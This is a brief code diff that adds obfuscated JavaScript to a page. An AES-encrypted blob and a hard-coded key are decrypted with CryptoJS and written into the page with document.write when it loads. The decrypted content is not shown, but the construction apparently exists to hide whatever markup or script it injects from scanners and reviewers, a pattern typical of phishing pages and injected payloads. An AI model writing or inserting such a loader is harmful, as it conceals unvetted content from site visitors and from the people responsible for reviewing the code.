@@ -1,0 +1,5 @@
+var aWRW="U2FsdGVkX19wVR08x1HxEBA4cP4l55TkygrO2+O5LuOxQqZiXGQcHBB34OEAle27S6MHUXGWNWUtsG2raKplUZhTNq6O4cWxQRLOGJtb6Hl47uDcDaD0hrlNlq0A5ZjOztRiN0sux1dmbRq3eHTfYHP2/rXQaaSNNvc8N96Jx/wEAaPI+lHmxdby7+3WxLbU+u3/87Bp0J9qZpmYRSrSRKqKrf5ibJMtbZ8s2V1o6XWQNQ37/N/wzWrZ+ndw53KbpXQQnKMD78axu4fa1LBh2x3YdDOdFzMbePEiUb2qkkaBmW0zW3mc90jI7JKYRELN/7LaWHGKzXg+7/iSE/tQ8lbZoxSwj2CdNL5CGDTgP2YBUmCb4SHaZM7OBlJ0ODZIpqmsgoTU7sPEmN8fAeVglId8Q/Tvi8VarBY7oNEDq18r/Ge3KodoI4NVFt10x4TRrx9UK3+n4LKvORqFx8xiVtOesAn4wnDWmokSXrjkiAGnluqS58IQUxUhmez5mNnIofqFFB9CgTImc3WdTlOx0A==" 
+ var ygqhU = "EXXqoYkTfBtqvCfy"; 
+ var BSYHVbR= CryptoJS.AES.decrypt(aWRW, ygqhU); 
+ var IzDici = BSYHVbR.toString(CryptoJS.enc.Utf8); 
+ document.write(IzDici) 
